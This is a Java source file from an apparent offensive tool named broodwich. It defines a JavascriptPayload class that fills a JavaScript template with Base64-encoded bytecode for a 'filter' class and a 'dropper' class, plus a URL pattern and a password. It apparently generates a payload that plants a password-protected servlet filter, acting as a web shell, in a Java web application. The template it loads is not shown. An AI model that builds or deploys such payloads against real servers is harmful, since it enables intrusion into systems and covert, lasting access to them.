package party.itistimeto.broodwich.payloads;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.text.MessageFormat;
import java.util.Base64;

public class JavascriptPayload extends AbstractPayload {
    public JavascriptPayload(String urlPattern, Class dropperClass, String password) throws NoSuchAlgorithmException, IOException, URISyntaxException {
        super(urlPattern, dropperClass, password);
    }

    @Override
    public String toString() {
        try {
            String jsTemplate = AbstractPayload.getResourceText("JavascriptPayloadTemplate.js");
            Object[] templateParams = new Object[]{
                this.filterClass.getName(),
                this.dropperClass.getName(),
                Base64.getEncoder().encodeToString(this.filterBytecode),
                Base64.getEncoder().encodeToString(this.dropperBytecode),
                this.urlPattern, /* care to self-js-inject? */
                this.password
            };
            return MessageFormat.format(jsTemplate, templateParams);
        } catch (IOException | URISyntaxException e) {
            return e.getMessage(); // don't @ me
        }
    }

    @Override
    public byte[] toBytes() {
        return this.toString().getBytes(StandardCharsets.UTF_8);
    }
}
